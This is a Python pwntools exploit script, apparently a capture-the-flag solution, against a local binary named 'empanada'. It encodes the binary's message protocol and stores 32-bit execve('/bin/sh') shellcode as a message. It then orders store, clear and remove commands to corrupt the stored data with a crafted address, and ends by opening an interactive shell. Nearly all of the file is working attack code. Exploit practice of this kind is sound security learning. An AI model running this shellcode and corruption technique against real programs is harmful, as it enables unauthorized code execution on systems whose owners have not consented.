from pwn import *
io = process('./empanada')
context.log_level = 'debug'
pause()

RM_ALL_MSG = 0x00         # remove all data
STORE_MSG = 0x10          # stored data
GET_HSUM = 0x20           # calculate sum
GET_MSG = 0x30            # print data
GET_MSG_COUNT = 0x40      # print number of message
RM_MSG = 0x50             # remove data
GET_ALL = 0x60            # print combined all stored data
CLEAR_INVALID_MSG = 0xfe  # remove invalid data

IS_CMD = 1
IS_NOT_CMD = 0

def make_type(typ, idx, size):
    return ((typ & 1) << 7) | ((idx & 3) << 5) | (size & 0x1f)

def send_msg(cmd, typ, idx, size, data):
    # size will be one more because of the cmd
    header = make_type(typ, idx, size + 1)
    print hex(header), hex(cmd), data
    io.send(chr(header))
    io.send(chr(cmd) + data)

data ="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
send_msg(STORE_MSG, IS_CMD,1,len(data),data)
data ="a"*15
send_msg(STORE_MSG, IS_NOT_CMD,0,len(data),data)
data ="b"*16
send_msg(STORE_MSG, IS_CMD,1,len(data),data)
data ="c"*15
send_msg(STORE_MSG, IS_NOT_CMD,0,len(data),data)
data ="1"*17+p32(0x33701010)
send_msg(STORE_MSG, IS_CMD,0,len(data),data)
data = ""

send_msg(CLEAR_INVALID_MSG, IS_CMD,0,len(data),data)

data ="d"*15
send_msg(STORE_MSG, IS_CMD,0,len(data),data)
data ="e"*15
send_msg(STORE_MSG, IS_CMD,0,len(data),data)
data = ""
pause()

send_msg(RM_MSG, IS_CMD,0,len(data),data)
data = ""

send_msg(RM_MSG, IS_CMD,0,len(data),data)
data = ""
pause()

send_msg(GET_ALL, IS_CMD,0,len(data),data)
data = ""
pause()
send_msg(CLEAR_INVALID_MSG, IS_CMD,0,len(data),data)

io.interactive()
